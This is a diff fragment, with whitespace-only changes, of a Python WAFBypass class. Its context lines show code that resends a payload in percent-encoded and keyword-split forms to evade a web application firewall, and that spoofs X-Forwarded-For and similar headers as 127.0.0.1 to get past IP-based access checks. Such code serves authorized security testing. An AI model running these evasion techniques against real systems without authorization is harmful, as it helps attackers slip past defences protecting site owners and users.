@@ -377,7 +377,7 @@ class WAFBypass:
     def __init__(self, target_url):
         self.url = target_url
         self.session = requests.Session()
-    
+
     def test_encoding_bypass(self, payload):
         encodings = [
             payload,
@@ -386,12 +386,12 @@ class WAFBypass:
             "".join(f"%{ord(c):02x}" for c in payload),
             payload.replace("script", "scr%69pt"),
         ]
-        
+
         for encoded in encodings:
             r = self.session.get(f"{self.url}?q={encoded}")
             if r.status_code != 403:
                 print(f"BYPASS: {encoded[:50]}... -> {r.status_code}")
-    
+
     def test_header_bypass(self):
         headers_list = [
             {"X-Forwarded-For": "127.0.0.1"},
@@ -399,7 +399,7 @@ class WAFBypass:
             {"X-Originating-IP": "127.0.0.1"},
             {"X-Custom-IP-Authorization": "127.0.0.1"},
         ]
-        
+
         for headers in headers_list:
             r = self.session.get(self.url, headers=headers)
             if r.status_code == 200:
